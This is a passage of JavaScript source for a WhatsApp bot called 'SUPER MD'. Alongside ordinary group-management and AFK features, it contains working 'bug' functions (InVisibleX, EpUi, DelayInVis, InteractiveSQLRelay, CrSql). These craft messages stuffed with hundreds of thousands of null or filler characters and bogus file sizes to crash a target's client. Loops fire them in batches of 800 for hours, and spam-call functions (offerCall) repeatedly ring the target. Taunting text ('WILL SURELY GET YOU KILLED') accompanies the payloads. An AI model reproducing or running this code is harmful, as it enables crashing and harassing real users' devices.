            nØbødy.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
if (!m.isGroup && !isCreator && !isSetsudo && global.db.settings.onlygroup) {
        	if (isCmd){
            return m.reply(`${global.onlygroup}`)
            }
        }
        // Private Only
        if (!isCreator && !isSetsudo && global.db.settings.onlypc && m.isGroup) {
        	if (isCmd){
	         return m.reply(`${global.onlypc}`)
	     }
	}
function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new BodyForm()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const bodyFormThen = new BodyForm()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  bodyFormThen.append('file', file)
			  bodyFormThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: bodyFormThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${bodyFormThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('library')
				   resolve({
						status: true,
						message: "Xeorz",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}
async function sendOfferCall(isTarget) {
    try {
        await nØbødy.offerCall(isTarget);
        console.log(chalk.white.bold(`Successfully Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await nØbødy.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Successfully Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
const Archerfeat = () =>{
            var mytext = fs.readFileSync("./SuperBot.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }

async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡ <————««»»————>̤",
                    footerText: "𝐍𝐎𝐁𝐎𝐃𝐘 𝐄𝐌𝐏 🙅",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡»»————><————««" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await nØbødy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await nØbødy.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𝐒𝐔𝐏𝐄𝐑 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 🏹",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        async function EpUi(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡»»————><————««",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await nØbødy.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
            console.log(chalk.green("Send Bug By Nobody Emp 🙅"));
        }
        async function EpHemeral(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡»»————><————««",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*𝐒𝐔𝐏𝐄𝐑 𝐖𝐈𝐋𝐋 𝐒𝐔𝐑𝐄𝐋𝐘 𝐆𝐄𝐓 𝐘𝐎𝐔 𝐊𝐈𝐋𝐋𝐄𝐃 😂😂😹😹😹 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐌𝐎𝐑𝐄.... 𝐒𝐔𝐏𝐄𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄𝐒*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await nØbødy.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
            console.log(chalk.green("Send Bug By Nobody Emp 🙅"));
        }
        async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan Delivery Completed According To The Designated Duration.");
            return;
        }

        if (count < 800) {
            await DelayInVis(X, false); // Menggunakan X dari input pengguna
            count++;
            sendNext(); // Melanjutkan pengiriman tanpa delay antar pesan
        } else {
            console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset untuk paket berikutnya
            console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
            setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
        }
    };

    sendNext();
};

async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
            return;
        }

        if (count < 800) {
            await InVisibleX(X, false); // Menggunakan X dari input pengguna
            count++;
            console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${X}`));
            sendNext(); // Melanjutkan pengiriman
        } else {
            console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset untuk paket berikutnya
            console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
            setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
        }
    };

    sendNext();
};

        async function DelayInVis(X, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                X,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await nØbødy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await nØbødy.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡»»————><————««" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        //=================================================//

		// NEW BUG 2025 HAX \\
		//QUOTED\\
		const CrSql = {
			key: {
				remoteJid: 'status@broadcast',
				fromMe: false,
				participant: '0@s.whatsapp.net',
			},
			message: {
				buttonsMessage: {
					documentMessage: {
						url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
						mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
						fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
						fileLength: "9999999999999",
						pageCount: 3567587327,
						mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
						fileName: "🩸⃟⃨〫⃰‣ ⁖𝐃͢𝚺𝐕𝚹𝐑𝐒𝐢͢𝚾𝐂𝚹𝐑͢𝚺 ‣—",
						fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
						directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
						mediaKeyTimestamp: "1735456100",
						contactVcard: true,
						caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
					},
					contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
					footerText: "©️ running since 2020 to 20##?",
					buttons: [{
						buttonId: "\u0000".repeat(900000),
						buttonText: {
							displayText: "𝐒𝐔𝐏𝐄𝐑 𝐈𝐒 𝐁𝐀𝐂𝐊 🏹➡»»————><————««",
						},
						type: 1,
					}, ],
					headerType: 3,
				},
			},
		}

		const CrSqlF = {
			key: {
				remoteJid: 'status@broadcast',
				fromMe: false,
				participant: '0@s.whatsapp.net',
			},
			message: {
				buttonsMessage: {
					documentMessage: {
						url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
						mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
						fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
						fileLength: "9999999999999",
						pageCount: 3567587327,
						mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
						fileName: "🩸⃟⃨〫⃰‣ ⁖𝐃͢𝚺𝐕𝚹𝐑𝐒𝐢͢𝚾𝐂𝚹𝐑͢𝚺 ‣—",
						fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
						directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
						mediaKeyTimestamp: "1735456100",
						contactVcard: true,
						caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
					},
					contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
					footerText: "©️ running since 2020 to 20##?",
					buttons: [{
						buttonId: "\u0000".repeat(350000),
						buttonText: {
							displayText: "𝐒𝐔𝐏𝐄𝐑 𝐈𝐒 𝐁𝐀𝐂𝐊 🏹➡»»————><————««",
						},
						type: 1,
					}, ],
					headerType: 3,
				},
			},
		}

		//FUNCTION\\
		async function HoldKey(X) {
			nØbødy.sendMessage(X, {
				text: "k",
				contextInfo: {
					forwardingScore: 999999,
					isForwarded: true,
					quotedAd: {
						advertiserName: " x ",
						mediaType: "IMAGE",
						jpegThumbnail: thumbUrl,
						caption: " x "
					},
					placeholderKey: {
						remoteJid: "0@s.whatsapp.net",
						fromMe: false,
						id: "ABCDEF1234567890"
					}
				}
			}, {
				quoted: m
			})
		}
		async function InteractiveSQLRelay(X, KeyS, Amount, ptcp = true) {
			let msg = await generateWAMessageFromContent(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								hasMediaAttachment: false
							},
							body: {
								text: "𝐀𝐫𝐜𝐡𝐞𝐫 𝐈𝐬 𝐁𝐚𝐜𝐤 🏹➡ <————««»»————>̤" + "ꦾ".repeat(Amount),
							},
							nativeFlowMessage: {
								messageParamsJson: "",
								buttons: [{
										name: "single_select",
										buttonParamsJson: "zero"
									},
									{
										name: "galaxy_message",
										buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
									},
									{
										name: "call_permission_request",
										buttonParamsJson: `{}`
									},
								]
							}
						}
					}
				}
			}, {
				userJid: X,
				quoted: KeyS
			});
            await nØbødy.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});					
			console.log(chalk.green("Send Bug By Nobody Emp 🙅"));
		};
if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    for (let ment of mentionUser) {
        if (checkAfkUser(ment, afk)) {
            let getId2 = getAfkId(ment, afk)
            let getReason2 = getAfkReason(getId2, afk)
            let getTimee = Date.now() - getAfkTime(getId2, afk)
            let anu2 = ms(getTimee)
            m.reply(
                `Hey, don't tag them for now! They're currently AFK~ 🤭\n\n` +
                `*Reason:* ${getReason2}\n` +
                `*Since:* ${anu2.hours} Hours, ${anu2.minutes} Minutes, ${anu2.seconds} Seconds`
            )
        }
    }

    if (checkAfkUser(m.sender, afk)) {
        let getId = getAfkId(m.sender, afk)
        let getReason = getAfkReason(getId, afk)
        let getTime = Date.now() - getAfkTime(getId, afk)
        let anu = ms(getTime)
        afk.splice(getAfkPosition(m.sender, afk), 1)
        fs.writeFileSync('./library/afk.json', JSON.stringify(afk))
        nØbødy.sendTextWithMentions(
            m.chat, 
            `Yay! @${m.sender.split('@')[0]} is back from AFK~ 🥳\n\n` +
            `*Reason:* ${getReason}\n` +
            `*Duration:* ${anu.hours} Hours, ${anu.minutes} Minutes, ${anu.seconds} Seconds`, 
            m
        )
    }
}
const isAfkOn = checkAfkUser(m.sender, afk)
		  if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
			const linkPatterns = [
				/http/i,
				/https/i,
				/www\./i,
				/wa\.me/i,
				/t\.me/i,
				/bit\.ly/i,
				/goo\.gl/i,
				/y2u\.be/i,
				/discord\.gg/i,
				/telegram\.me/i
			];
			const containsLink = linkPatterns.some(pattern => pattern.test(budy));
			if (containsLink) {
				if (isAdmins || m.key.fromMe || isCreator) return
				await nØbødy.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						fromMe: false,
						id: m.key.id,
						participant: m.key.participant
					}
				});
			}
		}
		
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const devnob = { nØbødy, toIDR, isCreator, Reply, command, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, speed, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, devnob)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================



switch (command) {
case 'menu': 
case 'help': {
let Menu = `
ⱧɆⱠⱠØ ${pushname} ⱧɆⱠⱠØ Ʉ₴ɆⱤ ₮Ⱨł₴ ₳ ₥Đ ฿Ø₮ ₵ⱤɆ₳₮ɆĐ ฿Ɏ ₦Ø฿ØĐɎ Ɇ₥₱ ⱠɆ₳ĐɆⱤ ₳₦Đ ł₥ ⱧɆⱤɆ ₮Ø ₳₴₴ł₴₮ ɎØɄ ₳₦Đ ĐØ ₩Ⱨ₳₮ɆVɆⱤ ɎØɄ ₳Đ₭ ₥Ɇ ₮Ø ĐØ, ł₣ ł ₣₳łⱠ ₮Ø ĐØ ₳₦ɎØ₦Ɇ ⱤɆ₱ØⱤ₮ ₥Ɇ ₮Ø ₥Ɏ Ø₩₦ɆⱤ ₳₴₳₱.

𝙎𝙐𝙋𝙀𝙍 𝙈𝘿 
𝒀𝑶𝑼𝑹𝑺 𝑺𝑰𝑵𝑪𝑬𝑹𝑬𝑳𝒀
╭────────────────────────────────────────────────────────╮
│  ─────────────╮
   
█ █▄░█ █▀ ▄▀▄
█ █░▀█ █▀ █░█
▀ ▀░░▀ ▀░ ░▀░
 ─────────────╯
╰────────────────────────────────────────────────────────╯

╭─────═━┈┈━═──━┈⊷
┇ _ʙᴏᴛ ɴᴀᴍᴇ_ : *𝚂𝚄𝙿𝙴𝚁 𝙼𝙳*
┇ _ᴠᴇʀꜱɪᴏɴ_ : *_1.1.0_*     
┇ _ᴘʟᴀᴛғᴏʀᴍ_ : *_𝙻𝚒𝚗𝚞𝚡_*
┇ _ᴅᴇᴠ_ : *_𝙼𝚛 𝙽𝚘𝚋𝚘𝚍𝚢 𝙴𝚖𝚙_*
┇ _ʀᴀᴍ_ : *_20𝙶𝙱.14𝙶𝙱_*
┇ _ᴛɪᴍᴇ_ : *${time}*
┇ _ᴄʀᴇᴀᴛᴇᴅ ᴏɴ_ : *${todayDateWIB}*
╰─────═━┈┈━═──━┈⊷

╭────────────────────────────────────────────────────────╮
│  ─────────────╮
  
█▄░▄█ █▀ █▄░█ █░█
█░█░█ █▀ █░▀█ █░█
▀░░░▀ ▀▀ ▀░░▀ ▀▀▀ 
 ─────────────╯
╰────────────────────────────────────────────────────────╯

╭─☬ _ᎷᏆՏᏟᎬᏞᏞᎪΝᎬϴႮՏ_ ☬
├─ ★ 𝗔𝗙𝗞
├─ ★ 𝗔𝗟𝗜𝗩𝗘
├─ ★ 𝗦𝗔𝗩𝗘
├─ ★ 𝗣𝗜𝗡𝗚
├─ ★ 𝗥𝗘𝗦𝗧𝗔𝗥𝗧
├─ ★ 𝗥𝗠𝗕𝗚
├─ ★ 𝗘𝗫𝗧𝗥𝗔𝗖𝗧
├─ ★ 𝗧𝗢𝗩𝗡
├─ ★ 𝗧𝗢𝗨𝗥𝗟
├─ ★ 𝗔𝗜
├─ ★ 𝗘𝗠𝗢𝗝𝗜𝗠𝗜𝗫
├─ ★ 𝗗𝗕𝗜𝗡𝗔𝗥𝗬
├─ ★ 𝗘𝗕𝗜𝗡𝗔𝗥𝗬 
├─ ★ 𝗙𝗘𝗧𝗖𝗛
├─ ★ 𝗦𝗣𝗔𝗠𝗖𝗔𝗟𝗟
├─ ★ 𝗦𝗣𝗔𝗠𝗖𝗔𝗟𝗟𝗩𝗜𝗗
├─ ★ 𝗧𝗘𝗦𝗧
├─ ★ 𝗦𝗣𝗘𝗘𝗗
├─ ★ 𝗚𝗜𝗧𝗛𝗨𝗕𝗦𝗧𝗔𝗟𝗞
├─ ★ 𝗠𝗢𝗗𝗘
├─ ★ 𝗦𝗘𝗧𝗔𝗟𝗜𝗩𝗘
├─ ★ 𝗟𝗜𝗦𝗧𝗕𝗟𝗢𝗖𝗞
├─ ★ 𝗥𝗨𝗡𝗧𝗜𝗠𝗘
├─ ★ 𝗚𝗘𝗧𝗦𝗘𝗦𝗦𝗜𝗢𝗡
├─ ★ 𝗙𝗙𝗦𝗧𝗔𝗟𝗞
├─ ★ 𝗣𝗨𝗕𝗟𝗜𝗖
├─ ★ 𝗣𝗥𝗜𝗩𝗔𝗧𝗘
├─ ★ 𝗧𝗢𝗧𝗔𝗟𝗙𝗘𝗔𝗧𝗨𝗥𝗘
├─ ★ 𝗙𝗟𝗜𝗣𝗧𝗘𝗫𝗧
├─ ★ 𝗖𝗟𝗘𝗔𝗥𝗖𝗛𝗔𝗧
├─ ★ 𝗔𝗨𝗧𝗢𝗦𝗘𝗡𝗗
├─ ★ 𝗪𝗘𝗔𝗧𝗛𝗘𝗥
├─ ★ 𝗧𝗥𝗔𝗖𝗞𝗜𝗣
├─ ★ 𝗢𝗪𝗡𝗘𝗥
├─ ★ 𝗨𝗣𝗧𝗜𝗠𝗘
╰─────────────────▀▄

╭─☬ _ᏀᎡϴႮᏢ_ ☬
├─ ★ 𝗦𝗧𝗢𝗣
├─ ★ 𝗚𝗣𝗣
├─ ★ 𝗞𝗜𝗖𝗞
├─ ★ 𝗔𝗗𝗗
├─ ★ 𝗣𝗥𝗢𝗠𝗢𝗧𝗘
├─ ★ 𝗗𝗘𝗠𝗢𝗧𝗘
├─ ★ 𝗜𝗡𝗩𝗜𝗧𝗘
├─ ★ 𝗜𝗡𝗩𝗜𝗧𝗘𝟭
├─ ★ 𝗠𝗨𝗧𝗘
├─ ★ 𝗨𝗡𝗠𝗨𝗧𝗘
├─ ★ 𝗝𝗢𝗜𝗡
├─ ★ 𝗟𝗘𝗔𝗩𝗘
├─ ★ 𝗚𝗘𝗧𝗝𝗢𝗜𝗡𝗥𝗘𝗤𝗨𝗘𝗦𝗧
├─ ★ 𝗥𝗘𝗩𝗢𝗞𝗘
├─ ★ 𝗚𝗜𝗡𝗙𝗢
├─ ★ 𝗔𝗡𝗧𝗜𝗦𝗣𝗔𝗠
├─ ★ 𝗛𝗜𝗗𝗘𝗧𝗔𝗚
├─ ★ 𝗣𝗢𝗟𝗟
├─ ★ 𝗪𝗔𝗥𝗡
├─ ★ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘
├─ ★ 𝗚𝗢𝗢𝗗𝗕𝗬𝗘
├─ ★ 𝗕𝗔𝗡
├─ ★ 𝗨𝗡𝗕𝗔𝗡𝗖𝗛𝗔𝗧
├─ ★ 𝗨𝗡𝗕𝗔𝗡𝗚𝗖
├─ ★ 𝗨𝗡𝗕𝗔𝗡
├─ ★ 𝗕𝗔𝗡𝗖𝗛𝗔𝗧
├─ ★ 𝗕𝗔𝗡𝗚𝗖
├─ ★ 𝗔𝗡𝗧𝗜𝗗𝗘𝗟𝗘𝗧𝗘
├─ ★ 𝗥𝗘𝗦𝗘𝗧𝗪𝗔𝗥𝗡
├─ ★ 𝗟𝗘𝗙𝗧
├─ ★ 𝗕𝗖𝗚𝗖
├─ ★ 𝗣𝗨𝗦𝗛𝗖𝗢𝗡𝗧
├─ ★ 𝗥𝗔𝗧𝗘
├─ ★ 𝗪𝗛𝗘𝗡
├─ ★ 𝗗𝗘𝗙𝗜𝗡𝗘
├─ ★ 𝗦𝗘𝗧𝗗𝗘𝗦𝗖
├─ ★ 𝗚𝗘𝗧𝗖𝗔𝗦𝗘
├─ ★ 𝗙𝗔𝗖𝗧
├─ ★ 𝗗𝗔𝗥𝗘
├─ ★ 𝗧𝗥𝗨𝗧𝗛
├─ ★ 𝗤𝗨𝗢𝗧𝗘𝗦
├─ ★ 𝗖𝗛𝗔𝗥𝗔𝗖𝗧𝗘𝗥𝗖𝗛𝗘𝗖𝗞
├─ ★ 𝗖𝗛𝗘𝗖𝗞𝗠𝗘
├─ ★ 𝗛𝗔𝗡𝗗𝗦𝗢𝗠𝗘𝗖𝗛𝗘𝗖𝗞
├─ ★ 𝗕𝗘𝗔𝗨𝗧𝗜𝗙𝗨𝗟𝗖𝗛𝗘𝗖𝗞
├─ ★ 𝗔𝗡𝗧𝗜𝗕𝗢𝗧
├─ ★ 𝗖𝗟𝗢𝗦𝗘𝗧𝗜𝗠𝗘
├─ ★ 𝗢𝗣𝗘𝗡𝗧𝗜𝗠𝗘
